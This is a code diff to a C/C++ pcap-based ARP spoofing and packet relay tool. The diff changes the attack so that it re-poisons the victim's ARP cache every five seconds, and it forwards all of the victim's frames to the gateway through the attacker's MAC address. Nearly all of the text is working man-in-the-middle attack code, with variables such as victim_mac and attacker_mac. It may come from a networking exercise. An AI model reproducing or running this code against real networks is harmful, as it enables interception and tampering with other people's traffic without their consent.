@@ -7,6 +7,8 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include "kbhit.h"
+#include <unistd.h>
+#include <time.h>
 #pragma pack(push, 1)
 typedef struct ARP_Packet{
     Ether eth;
@@ -130,32 +132,40 @@ void send_arp_reply(pcap_t* handle, uint8_t victim_mac[],uint8_t attacker_mac[],
     }
 }
 
-void re_infect(Ether * eth, pcap_t* handle, pcap_pkthdr *header, const u_char* data, uint8_t *victim_mac, uint8_t *attacker_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){
+//void re_infect(Ether * eth, pcap_t* handle, pcap_pkthdr *header, const u_char* data, uint8_t *victim_mac, uint8_t *attacker_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){
 
-    ARP_Packet* arp = (ARP_Packet*)data;
-    if(ntohl(arp->arp.tag_ip) == gateway_ip){
-        if(ntohs(arp->arp.opcode) == 0x0001){   //victim send request packet to gateway ?
-            send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
-            printf("Send ARP reply Packet\n");
-        }
-        else{   //victim send reply packet to gateway
-            if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
-                memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
-                memcpy(arp->arp.src_mac, attacker_mac, sizeof(uint8_t)*6);
-                memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
-                memcpy(arp->arp.tag_mac, gateway_mac, sizeof(uint8_t)*6);
-                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
-                if (res2 != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
-                }
-            }
-        }
-    }
-}
+//    ARP_Packet* arp = (ARP_Packet*)data;
+//    if(ntohl(arp->arp.tag_ip) == gateway_ip){
+//        if(ntohs(arp->arp.opcode) == 0x0001){   //victim send request packet to gateway ?
+//            send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
+//            printf("Send ARP reply Packet\n");
+//        }
+//        else{   //victim send reply packet to gateway
+//            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
+//            memcpy(arp->arp.src_mac, attacker_mac, sizeof(uint8_t)*6);
+//            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
+//            memcpy(arp->arp.tag_mac, gateway_mac, sizeof(uint8_t)*6);
+//            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
+//            if (res2 != 0) {
+//                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
+//            }
+//        }
+//    }
+//}
 
 void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){
+    struct timeval start, current;
+
     init_keyboard();
+    gettimeofday(&start, 0);
+
     while(true){
+        gettimeofday(&current,0);
+        if(current.tv_sec == (start.tv_sec +5)){
+            send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
+            printf("Send ARP reply Packet\n");
+            start.tv_sec = current.tv_sec;
+        }
         if(_kbhit()){
             close_keyboard();
             break;
@@ -171,19 +181,14 @@ void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, ui
         Ether* eth = (Ether *)data;
 
         if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
-            if(ntohs(eth->pkt_type) != 0x0800){
-                memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
-                memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
-                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
-                if (res2 != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
-                }
+            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
+            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
+            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
+            if (res2 != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
             }
-            else{ // victim send arp (reqeust or reply)
-                re_infect(eth, handle,header, data, victim_mac, attacker_mac, gateway_mac, gateway_ip, victim_ip);
-            }
+            printf("Relaying....\n");
         }
-        printf("Relaying....\n");
     }
 }
 
